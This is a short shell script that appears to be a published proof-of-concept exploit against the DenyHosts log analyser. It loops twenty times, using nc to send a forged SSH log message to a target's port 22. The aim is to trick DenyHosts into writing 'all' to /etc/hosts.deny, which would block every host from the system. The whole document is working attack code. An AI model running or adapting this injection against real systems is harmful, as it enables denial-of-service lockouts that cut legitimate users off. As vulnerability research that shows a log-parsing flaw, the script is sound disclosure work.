#/bin/sh

# Simple "exploit" example for denyhosts. It will add "all"
# to /etc/hosts.deny
# by Daniel B. Cid  - dcid ( at ) ossec.net
# http://www.ossec.net/en/attacking-loganalysis.html

if [ "x$1" = "x" ]; then
    echo "$0: <ip address>"
    exit 1;
fi

ip=$1;
i=0
while [ 1 ]; do
   i=`expr $i + 1`
   echo $i;

   if [ $i = 20 ]; then
     break;
   fi

    echo "User root from all not allowed because none of user's groups are listed in AllowGroups" | nc $ip 22

    if [ ! $? = 0 ]; then
        echo "Unable to connect (or nc not present)."
        exit 1;
    fi

done
